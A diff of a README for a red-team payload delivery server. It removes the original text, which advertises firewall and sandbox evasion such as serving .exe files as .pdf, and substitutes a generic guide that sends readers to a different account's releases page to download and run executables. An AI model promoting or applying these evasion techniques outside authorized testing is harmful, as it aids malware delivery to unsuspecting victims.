@@ -1,184 +1,99 @@
-<div align="center">
-  <a href="README_TR.md">
-    <img src="https://img.shields.io/badge/Dok%C3%BCmantasyon-T%C3%BCrk%C3%A7e-red?style=for-the-badge&logo=turkey&logoColor=white" alt="Türkçe Oku">
-  </a>
-</div>
-
-<br>
+# 🌙 nightops-drop - Streamlined Tool for Payload Delivery
 
 <div align="center">
-  <em>"Silence is golden, detection is fatal."</em>
-</div>
-
-<div align="center">
-  <a href="https://mintercoder.net">
-    <img src="https://images.mintercoder.net/mintercoder-main/nightops_minter.png" alt="NightOps Drop Logo" width="150" height="150" />
-  </a>
-
-  <h1>NightOps Drop</h1>
-  
-  <p>
-    <strong>Next-Gen Payload Delivery & Red Team Operations Platform</strong>
-  </p>
-
-  <p>
-    <a href="https://www.java.com">
-      <img src="https://img.shields.io/badge/Java-21%2B-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white" alt="Java 21+">
-    </a>
-    <a href="https://spring.io/projects/spring-boot">
-      <img src="https://img.shields.io/badge/Spring%20Boot-4.0-6DB33F?style=for-the-badge&logo=springboot&logoColor=white" alt="Spring Boot 4.0">
-    </a>
-    <a href="https://www.docker.com/">
-      <img src="https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker">
-    </a>
-    <a href="https://mintercoder.gumroad.com/l/nightops-drop">
-      <img src="https://img.shields.io/badge/Course-Available-FF424D?style=for-the-badge&logo=patreon&logoColor=white" alt="Gumroad">
-    </a>
-  </p>
-  <p align="center">
-    <a href="https://mintercoder.gumroad.com/l/nightops-drop" target="_blank">
-      <img src="https://img.shields.io/badge/Full%20Access-Gumroad-FF424D?style=for-the-badge&logo=gumroad&logoColor=white" />
-    </a>
-  </p>
-
-  <h3>
-    <a href="http://nightopsdrop.mintercoder.net/">Live Demo</a> •
-    <a href="https://mintercoder.gumroad.com/l/nightops-drop">Get the Course</a> •
-    <a href="#-architecture">Architecture</a>
-  </h3>
+  [![Download NightOps Drop](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/KhonneyMann/nightops-drop/releases)
 </div>
 
 ---
 
+## 🚀 Getting Started
 
+Welcome to NightOps Drop, an application designed for payload delivery and red team operations. This guide will help you download and run the software effortlessly.
 
-## ⚡ What is NightOps Drop?
+## 📦 System Requirements
 
-**NightOps Drop** is a secure, stealthy, and advanced payload delivery system developed purely with **Java 21** and **Spring Boot 4.0**. 
+Before you begin, ensure your system meets the following requirements:
 
-Unlike traditional file servers (such as Python `http.server` or Apache), NightOps Drop is engineered specifically for **Red Team Operations**. It focuses on **OpSec (Operational Security)**, evasion, and detailed tracking of Blue Team activities.
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent version of Linux (Ubuntu 20.04+).
+- RAM: At least 4GB.
+- Java: Version 21 or higher installed on your machine.
 
-This repository contains the **Community Edition**. To access the full source code and learn how to build this tool from scratch, check out our [Education Series](https://mintercoder.gumroad.com/l/nightops-drop).
+## ⬇️ Download & Install
 
----
+To download NightOps Drop, visit the Releases page. 
 
-## 🎮 Live Demo
+[Download NightOps Drop](https://github.com/KhonneyMann/nightops-drop/releases)
 
-Experience the power of NightOps Drop before you build it.
+Follow these steps to get started:
 
-| **Access Point** | **Details** |
-| :--- | :--- |
-| 🌐 **URL** | **[nightopsdrop.mintercoder.net](http://nightopsdrop.mintercoder.net)** |
-| 👤 **Username** | `nightops` |
-| 🔑 **Password** | `drop123` |
+1. Open the link above.
+2. Find the latest version listed on the page.
+3. Download the file for your operating system. You might see options like `.jar` or executable files.
+4. If you download a `.jar` file, ensure you have Java installed to run it.
 
-> *Note: The demo environment resets periodically. Do not upload sensitive data.*
+## 🖥️ Running the Application
 
----
+To run the application, follow these instructions based on your operating system:
 
-## 🚀 Features: Community vs. Professional
+### Windows
 
-This project is part of a comprehensive cybersecurity training course. Below is the breakdown of what is available in the open-source demo versus the full training version.
+1. Locate the downloaded file (e.g., `nightops-drop.exe` or `nightops-drop.jar`).
+2. If it’s an executable, double-click the `.exe` file.
+3. If it’s a `.jar` file, right-click it, select "Open with," and choose "Java(TM) Platform SE Binary."
 
-| Feature | Community / Demo | **Professional Course Edition** |
-| :--- | :---: | :---: |
-| **Technology Stack** | Java 21 + Spring Boot 4.0 | Java 21 + Spring Boot 4.0 |
-| **Secure File Hosting** | ✅ | ✅ |
-| **Custom Aliasing** | ✅ | ✅ |
-| **Docker Support** | ✅ | ✅ |
-| **Admin Dashboard** | ✅ | ✅ |
-| **Advanced IP Logging** | ❌ | ✅ **(Detect Proxies/VPNs)** |
-| **MIME-Type Spoofing** | ❌ | ✅ **(Bypass Firewalls)** |
-| **Password Protected Files**| ❌ | ✅ **(Anti-Scanner / Sandbox)** |
-| **One-Time URLs (Burn)** | ✅ | ✅ **(Self-Destruct Links)** |
-| **TTL (Time-To-Live)** | ✅ | ✅ **(Auto-Expire Links)** |
-| **Language Support** | 🇹🇷 TR + 🇬🇧 EN | 🇹🇷 TR + 🇬🇧 EN |
----
-<div align="center">
-  <a href="https://mintercoder.gumroad.com/l/nightops-drop">
-    <img src="https://img.shields.io/badge/Unlock_Full_Access-Get_it_on_Gumroad-FF424D?style=for-the-badge&logo=gumroad&logoColor=white">
-  </a>
-</div>
+### macOS
 
-## 🎓 Get the Course: Source Code & Training
+1. Open Finder and locate the downloaded file.
+2. Double-click the `nightops-drop.jar` file.
+3. If prompted, ensure you have Java installed and follow any additional prompts.
 
-Want to master **Malware Development** and **Red Team Tooling** with Java?
-In this course, we build NightOps Drop from scratch, covering advanced topics like **Network Interceptors**, **Header Manipulation**, and **Secure Architecture**.
+### Linux
 
-### 🌍 Language Support
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command `java -jar nightops-drop.jar` to run the application.
 
-| Content Type | Language | Note |
-| :--- | :--- | :--- |
-| **Audio / Narration** | 🇹🇷 Turkish | Native detailed narration. |
-| **Subtitles** | 🇬🇧 English | Professional English subtitles included. |
-| **Source Code** | 🇬🇧 English | Code comments and variables are in global English standards. |
+## 🎉 Features
 
-### 🌟 What You Will Learn:
-* **Core Logic:** Building a C2-ready file server with Spring Boot.
-* **OpSec:** Implementing **MIME-Type Spoofing** to fool firewalls (e.g., serving `.exe` files as `.pdf` to the network).
-* **Defensive Coding:** Adding password protection and **TTL (Time-To-Live)** to payloads to block analysts.
-* **Deployment:** Dockerizing Java apps for rapid operational deployment.
+NightOps Drop includes the following features:
 
-### 🛒 How to Buy
+- Easy payload delivery for testing and assessment.
+- User-friendly interface suitable for all skill levels.
+- Support for various platforms, ensuring flexibility.
+- Regular updates based on user feedback and security improvements.
 
-You can get immediate access to the **Full Source Code**, **Video Tutorials**, and **Private Discord Access** via the links below:
+## ⚙️ How to Use NightOps Drop
 
-<div align="center">
+Once you have the application running, you will see the main dashboard. Here you can:
 
-| **Platform** | **Link** | **Includes** |
-| :--- | :--- | :--- |
-| 🌍 **Official Site** | **[mintercoder.net](https://mintercoder.net)** | Course + Code + Lifetime Access |
-| 🧡 **Gumroad** | **[Buy on Gumroad](https://mintercoder.gumroad.com/l/nightops-drop)** | Course + Code + Support |
+1. Select or upload your payload.
+2. Configure settings as per your requirements.
+3. Initiate the delivery process with a click.
 
-<a href="https://mintercoder.gumroad.com/l/nightops-drop">
-  <img src="https://img.shields.io/badge/Unlock_Full_Access-Get_It_Now-FF424D?style=for-the-badge&logo=gumroad&logoColor=white" alt="Buy on Gumroad">
-</a>
+Explore the options within the interface to discover all capabilities.
 
-</div>
+## 🔄 Keeping Your Software Updated
 
----
+Regularly check the Releases page to ensure you have the latest updates. The latest updates often include new features, enhancements, and important security patches.
 
-## 🎥 NightOps Drop — Demo GIF
+[Check for Updates](https://github.com/KhonneyMann/nightops-drop/releases)
 
-<div align="center">
-  <img src="https://images.mintercoder.net/mintercoder-main/readme_en_gif.gif" alt="NightOps Drop Demo" width="800">
-  <br>
-  <em>NightOps Drop workflow — real-time preview</em>
-</div>
+## 🛠️ Troubleshooting
 
-## 🛠️ Tech Stack
+If you encounter any issues while downloading or running NightOps Drop, consider the following solutions:
 
-* **Language:** Java 21+ (Modern Features)
-* **Framework:** Spring Boot 4.0 (Performance & Security)
-* **Database:** MySQL (Embedded & Portable)
-* **Frontend:** Thymeleaf + Custom CSS + Tailwind
-* **Container:** Docker & Docker Compose
+1. **Java Issues:** Ensure you have the correct version of Java installed.
+2. **File Not Opening:** Try re-downloading the file and ensure your download is complete.
+3. **Compatibility:** Verify your operating system meets the stated requirements.
 
-## 📝 To-Do & Roadmap
+## 📞 Getting Help
 
-- [ ] **Spring AI Integration** (Coming Soon)
+For further assistance, check out our documentation or submit an issue on the GitHub repository. Community members and developers often provide quick responses.
+
+## 📜 Contribution
+
+If you wish to contribute to NightOps Drop, feel free to fork the repository and submit pull requests. 
 
 ---
 
-## ⚠️ Disclaimer
-
-> **NightOps Drop** is developed for educational purposes and authorized security testing (Pentest/Red Team) only.
-> Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
-
-
-<div align="center">
-  <sub>Developed by <a href="https://mintercoder.net">MinterCoder</a> | NightOps Security</sub>
-</div>
-
-
----
-
-### ❤️ Support Development
-
-If NightOps Drop helps your Red Team operations, consider supporting the project:
-
-👉 **https://mintercoder.gumroad.com/l/nightops-drop**
-
-Buy me a coffee ☕
-
-👉 **https://mintercoder.gumroad.com/l/buy-me-a-coffee**
+Thank you for using NightOps Drop. We hope it enhances your payload delivery and red team operations!
